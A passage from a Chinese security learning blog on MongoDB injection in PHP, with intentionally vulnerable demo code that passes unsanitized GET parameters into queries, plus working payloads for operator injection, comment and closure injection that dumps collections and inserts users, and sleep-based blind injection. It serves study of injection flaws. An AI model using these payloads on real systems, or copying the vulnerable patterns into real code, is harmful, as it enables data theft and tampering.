<span class="token variable">$collection</span><span class="token operator">-&gt;</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"title"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"World"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"justOne"</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 显示可用文档数据</span>
<span class="token variable">$cursor</span> <span class="token operator">=</span> <span class="token variable">$collection</span><span class="token operator">-&gt;</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$cursor</span> <span class="token keyword">as</span> <span class="token variable">$document</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token variable">$document</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"title"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>访问之后，即删除了title为World的文档，在数据库中查不到Mi1k集合的文档内容了。</p>
<h3 id="5-2-2-使用execute-函数执行字符串">5.2.2 使用execute()函数执行字符串</h3>
<p>使用的Demo大致如下，此时传进方法execute()的参数就是字符串变量$query（特别的，此时的字符串书写语法为JS的书写语法）：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mongoclient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-&gt;</span><span class="token property">myinfo</span><span class="token punctuation">;</span> <span class="token comment">//选择数据库</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"db.table.save({'newsid':1})"</span><span class="token punctuation">;</span>    <span class="token comment">//增</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"db.table.find({'newsid':1})"</span><span class="token punctuation">;</span>    <span class="token comment">//查</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"db.table.remove({'newsid':1})"</span><span class="token punctuation">;</span>    <span class="token comment">//减</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"db.table.update({'newsid':1},{'newsid',2})"</span><span class="token punctuation">;</span>    改
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="5-3-PHP-MongoDB注入攻击">5.3 PHP MongoDB注入攻击</h2>
<p>不同编程语言环境下的MongoDB注入情景没啥差别，这里主要对PHP中实现的MongoDB进行详细分析，理解原理和场景就OK，其他语言就大致给Demo就好。</p>
<p>在此之前，我们需要先初始化数据库、赋给一些用户数据用于后面的Demo使用，这里随机添加10个用户，最后一个test用户为公共用户、大家都知道的：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 连接到mongodb</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>            <span class="token comment">// 选择一个数据库</span>
<span class="token variable">$collection</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span> <span class="token comment">// 选择集合</span>
<span class="token variable">$ori</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0123456789abcdefghijklmnopqrstuvwsyz'</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token variable">$ori</span><span class="token punctuation">[</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$ori</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token string single-quoted-string">'userid'</span><span class="token operator">=&gt;</span><span class="token variable">$i</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'username'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'user'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'password'</span><span class="token operator">=&gt;</span><span class="token variable">$str</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$collection</span><span class="token operator">-&gt;</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'添加成功&lt;br&gt;'</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string single-quoted-string">'userid'</span><span class="token operator">=&gt;</span><span class="token number">10</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'username'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'password'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'test'</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$collection</span><span class="token operator">-&gt;</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'用户test添加成功'</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>访问触发一遍即可创建成功：</p>
<p><img src="image-20231015114445664.png" alt="image-20231015114445664"></p>
<h3 id="5-3-1-PHP数组注入-重言式注入">5.3.1 PHP数组注入/重言式注入</h3>
<p>一个数组绑定的查询代码如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 连接到mongodb</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span> <span class="token comment">//选择数据库</span>
<span class="token variable">$coll</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span> <span class="token comment">//选择集合</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token string single-quoted-string">'username'</span><span class="token operator">=&gt;</span><span class="token variable">$username</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'password'</span><span class="token operator">=&gt;</span><span class="token variable">$password</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$coll</span><span class="token operator">-&gt;</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'username:'</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'password:'</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'未找到'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当我们用公共用户test输入时，显示出username和password：</p>
<p><img src="image-20231015114522868.png" alt="image-20231015114522868"></p>
<p>分析一下，这里我输入的是<code>?username=test&amp;password=test</code>，然后进入到MongoDB中的语句其实为<code>db.test.find({username:'test',password:'test'});</code>。</p>
<p>若此时我们以PHP数组的形式输入<code>?username[a]=test&amp;password=test</code>，源码中$data的值便为：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">data</span> <span class="token operator">=</span> array<span class="token punctuation">(</span>
        <span class="token string">'username'</span><span class="token operator">=</span><span class="token operator">&gt;</span>array<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'password'</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">'test'</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后实际MongoDB执行的语句为<code>db.test.find({username:{a:'test'},password:'test'});</code>。</p>
<p>因此，我们就可以利用这个特性往数组的键名传递一个操作符（大于，小于，等于，不等于等等），从而达到利用的目的：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?username[$ne]=1&amp;password[$ne]=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>$ne即not equal不等于，转换到MongoDB语句即为：</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">db.test.find({username:{'$ne':'1'},password:{'$ne':'1'}});<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>而该语句相当于：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> username<span class="token operator">!=</span><span class="token string">'1'</span> <span class="token operator">and</span> password<span class="token operator">!=</span><span class="token string">'1'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>直接爆出了所有数据库用户信息：</p>
<p><img src="image-20231015114632550.png" alt="image-20231015114632550"></p>
<h3 id="5-3-2-execute-执行拼接字符串导致的注入-联合查询注入">5.3.2 execute()执行拼接字符串导致的注入/联合查询注入</h3>
<p>代码如下，为了方便查看注入的语句，我这里添加了输出查询语句：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"var data = db.test.findOne({username:'<span class="token interpolation"><span class="token variable">$username</span></span>',password:'<span class="token interpolation"><span class="token variable">$password</span></span>'});return data;"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>
<span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ok'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'retval'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'username:'</span><span class="token operator">.</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'retval'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'password:'</span><span class="token operator">.</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'retval'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'未找到'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'errmsg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到，是直接拼接起来的字符串然后传入execute()函数中执行。</p>
<p>正常访问：</p>
<p><img src="image-20231015120642489.png" alt="image-20231015120642489"></p>
<p>添加个单引号试试，发现会报错：</p>
<p><img src="image-20231015120649925.png" alt="image-20231015120649925"></p>
<p>此时可以利用注释或闭合的方法针对性地实现注入就可以了。</p>
<h4 id="利用注释">利用注释</h4>
<p>按照输出的提示语句以及报错信息逐个尝试，目的是成功注释掉后面的password部分语句并返回成功，当输入如下payload时成功返回：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?username=test'});return true;})//&amp;password=test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015120741891.png" alt="image-20231015120741891"></p>
<p>这里返回username和password两项，按照MongoDB数据的Json格式，我们可以让其返回Json键值对看看：</p>
<p><img src="image-20231015120758248.png" alt="image-20231015120758248"></p>
<p>没问题，剩下的就是各种payload尝试了。</p>
<p>爆数据库版本：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?username=test'});return {username:db.version(),password:1};})//&amp;password=test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015120835290.png" alt="image-20231015120835290"></p>
<p>爆当前数据库所有集合，这里因为db.getCollectionNames()返回的是数组、需要用tojson()转换为字符串，另外MongoDB函数区分大小写：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?username=test'});return {username:tojson(db.getCollectionNames()),password:1};})//&amp;password=test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015120913560.png" alt="image-20231015120913560"></p>
<p>爆其他集合第一条数据，我这里本地新建user集合并插入文档，若想继续遍历爆其他信息只需修改数组下标即可：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?username=test'});return {username:tojson(db.user.find()[0]),password:1};})//&amp;password=test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015120948575.png" alt="image-20231015120948575"></p>
<p>往user集合插入新用户数据：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?username=test'});return {username:db.user.insert({'username':'mi1k7ea','password':'mi1k7ea'}),password:1};})//&amp;password=test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015121028062.png" alt="image-20231015121028062"></p>
<h4 id="利用闭合">利用闭合</h4>
<p>构造如下payload，用于闭合后面的语句使语法正确：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?username=test'});return {username:db.version(),password:1};var b=({a:'1&amp;password=test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20231015121125642.png" alt="image-20231015121125642"></p>
<p>剩下的其他利用和前面的一样，这里只说个重点的，在无回显的情况下，我们就需要用到盲注技巧，这里用到的盲注是基于时间的盲注，在高版本下MongoDB添加了sleep()函数，我们利用这个sleep()函数和闭合的技巧来实现基于时间的盲注（这种盲注技巧仅在闭合的情况下可行，本人在注释的情况下并未成功）：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?username=test'});if (db.version()&gt;"0"){sleep(10000);exit;}var b=({a:'1&amp;password=test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>若数据库版本大于0，则sleep 10s：</p>
<p><img src="image-20231015121203275.png" alt="image-20231015121203275"></p>
<p>剩下的就是进阶的了，可参考下面的</p>
<h1>0x06 总结</h1>
<p>emmm本次文章呢，旨在初步了解各种常用数据库的常规注入语句，进阶的内容的很少（但我心里认为还是有必要深度学习一下的）不过我感觉学好MySQL的话也是很有帮助的，剩下的可以遇到的时候百度什么的。</p>
<p>本文呢也只是简单总结一下，copy rate is 99.9999999999…%（我也不想啊，太菜了，遇到不会的知识，以目前的我根本没能力写出高质量的文章（也就是用自己的语言以及思考去写），只得抄袭众多大佬的，但希望这些知识可以变成自己的，不论如何我都会努力提升自己，在日后提升文章质量（毕竟只有这样，我认为才学的深刻吧），本文也会一直更新（难免实战遇到来更新一下）。</p>
<p>加油！！</p>
<h1>0x07 参考文章</h1>
<h2 id="mssql参考">mssql参考</h2>
<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#42-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5">MSSQL 注入与提权方法整理</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/TheTai/p/14371392.html">Mysql 隐式类型转换</a></p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/mssql-injection-learn/">MSSQL 注入学习笔记</a></p>
<p><a target="_blank" rel="noopener" href="https://macchiato.ink/web/web_security/mssql_injection_setup/">MSSQL注入环境搭建</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/286862.html">渗透测试之基础篇：Microsoft SQL Server手注之联合查询注入</a> --靶场实战参考</p>
<h2 id="postgresql参考">postgresql参考</h2>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/249371.html">postgresql注入</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/%E8%BD%AF%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/PostgreSQL.md">[PostgreSQL]</a></p>
<h2 id="Oracle参考">Oracle参考</h2>
<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/oracle-sql-inject/">Oracle SQL注入学习</a>  --含提权</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7897">关于学习Oracle注入</a></p>
<p><a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/oracle%E6%B3%A8%E5%85%A5/">[Oracle注入]</a></p>
<p><a target="_blank" rel="noopener" href="https://550532788.github.io/2020/08/10/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Oracle%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">从零开始的Oracle注入学习</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">【实战】Oracle注入总结</a></p>
<h2 id="MongoDB参考">MongoDB参考</h2>
<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/08/11/NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB/#0x04-PHP-MongoDB%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">NoSQL注入之MongoDB</a></p>
<p><a target="_blank" rel="noopener" href="https://xi4or0uji.github.io/2019/02/27/MongoDB%E6%B3%A8%E5%85%A5/">MongoDB注入</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/#">MongoDB 注入指北 丨</a></p>
<p><a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/3939">http://drops.wooyun.org/tips/3939</a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://hybcx.xyz/2023/10/15/sql-zhu-ru-tuo-zhan/">http://hybcx.xyz/2023/10/15/sql-zhu-ru-tuo-zhan/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">hybcx</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">随缘，看各位佬的心情</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
